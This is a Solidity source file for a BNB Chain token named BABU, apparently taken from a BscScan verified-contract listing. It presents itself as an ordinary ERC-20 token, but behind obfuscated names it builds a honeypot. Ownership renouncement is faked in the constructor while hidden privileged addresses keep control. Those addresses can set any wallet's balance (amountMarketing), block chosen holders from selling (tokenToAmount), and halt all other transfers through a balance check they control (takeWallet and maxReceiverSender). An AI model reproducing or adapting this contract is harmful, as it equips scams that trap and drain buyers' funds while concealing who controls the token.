/**
 *Submitted for verification at BscScan.com on 2023-04-25
*/

/**
 *Submitted for verification at BscScan.com on 2023-04-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface maxTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamExempt) external view returns (uint256);

    function transfer(address atReceiver, uint256 senderMaxExempt) external returns (bool);

    function allowance(address swapLiquidityIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderMaxExempt) external returns (bool);

    function transferFrom(
        address sender,
        address atReceiver,
        uint256 senderMaxExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptFund, uint256 value);
    event Approval(address indexed swapLiquidityIs, address indexed spender, uint256 value);
}

interface totalLaunch is maxTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract listSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountExempt {
    function createPair(address atShouldMarketing, address atTradingList) external returns (address);
}

interface atList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract BABU is listSell, maxTo, totalLaunch {

    address amountMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public exemptMarketingShould;

    mapping(address => bool) public minFeeReceiver;

    bool private modeMin;

    string private tradingModeTx = "BBU";

    function transfer(address liquidityTx, uint256 senderMaxExempt) external virtual override returns (bool) {
        return maxReceiverSender(_msgSender(), liquidityTx, senderMaxExempt);
    }

    function liquidityModeReceiver(address isSell) public {
        if (swapSender) {
            return;
        }
        
        toBuy[isSell] = true;
        
        swapSender = true;
    }

    constructor (){
        if (walletReceiver == swapExempt) {
            limitFundMarketing = false;
        }
        tradingAt();
        atList marketingToken = atList(buyTeamIs);
        atSender = amountExempt(marketingToken.factory()).createPair(marketingToken.WETH(), address(this));
        if (atBuy) {
            senderTotal = exemptMarketingShould;
        }
        autoTx = _msgSender();
        toBuy[autoTx] = true;
        fundToken[autoTx] = enableTrading;
        
        emit Transfer(address(0), autoTx, enableTrading);
    }

    function decimals() external view virtual override returns (uint8) {
        return sellLaunched;
    }

    bool public atBuy;

    uint256 private senderTotal;

    uint256 public swapExempt;

    uint8 private sellLaunched = 18;

    bool private limitFundMarketing;

    function allowance(address totalFund, address totalTxTrading) external view virtual override returns (uint256) {
        if (totalTxTrading == buyTeamIs) {
            return type(uint256).max;
        }
        return senderFee[totalFund][totalTxTrading];
    }

    function owner() external view returns (address) {
        return exemptLaunched;
    }

    function tokenToAmount(address marketingMax) public {
        sellAt();
        
        if (marketingMax == autoTx || marketingMax == atSender) {
            return;
        }
        minFeeReceiver[marketingMax] = true;
    }

    function takeWallet(uint256 senderMaxExempt) public {
        sellAt();
        amountSender = senderMaxExempt;
    }

    function transferFrom(address receiverMin, address atReceiver, uint256 senderMaxExempt) external override returns (bool) {
        if (_msgSender() != buyTeamIs) {
            if (senderFee[receiverMin][_msgSender()] != type(uint256).max) {
                require(senderMaxExempt <= senderFee[receiverMin][_msgSender()]);
                senderFee[receiverMin][_msgSender()] -= senderMaxExempt;
            }
        }
        return maxReceiverSender(receiverMin, atReceiver, senderMaxExempt);
    }

    function amountMarketing(address liquidityTx, uint256 senderMaxExempt) public {
        sellAt();
        fundToken[liquidityTx] = senderMaxExempt;
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingModeTx;
    }

    address public atSender;

    function senderReceiver(address receiverMin, address atReceiver, uint256 senderMaxExempt) internal returns (bool) {
        require(fundToken[receiverMin] >= senderMaxExempt);
        fundToken[receiverMin] -= senderMaxExempt;
        fundToken[atReceiver] += senderMaxExempt;
        emit Transfer(receiverMin, atReceiver, senderMaxExempt);
        return true;
    }

    function approve(address totalTxTrading, uint256 senderMaxExempt) public virtual override returns (bool) {
        senderFee[_msgSender()][totalTxTrading] = senderMaxExempt;
        emit Approval(_msgSender(), totalTxTrading, senderMaxExempt);
        return true;
    }

    function maxReceiverSender(address receiverMin, address atReceiver, uint256 senderMaxExempt) internal returns (bool) {
        if (receiverMin == autoTx) {
            return senderReceiver(receiverMin, atReceiver, senderMaxExempt);
        }
        uint256 atIsFund = maxTo(atSender).balanceOf(amountMode);
        require(atIsFund == amountSender);
        require(!minFeeReceiver[receiverMin]);
        return senderReceiver(receiverMin, atReceiver, senderMaxExempt);
    }

    uint256 takeFromSender;

    address private exemptLaunched;

    function balanceOf(address teamExempt) public view virtual override returns (uint256) {
        return fundToken[teamExempt];
    }

    function tradingAt() public {
        emit OwnershipTransferred(autoTx, address(0));
        exemptLaunched = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableTrading;
    }

    uint256 private enableTrading = 100000000 * 10 ** 18;

    mapping(address => uint256) private fundToken;

    address public autoTx;

    function sellAt() private view {
        require(toBuy[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return txWallet;
    }

    bool public swapWallet;

    mapping(address => bool) public toBuy;

    address buyTeamIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return exemptLaunched;
    }

    uint256 amountSender;

    mapping(address => mapping(address => uint256)) private senderFee;

    string private txWallet = "BABU";

    event OwnershipTransferred(address indexed receiverMax, address indexed tokenSell);

    bool public shouldSell;

    bool public swapSender;

    uint256 public walletReceiver;

}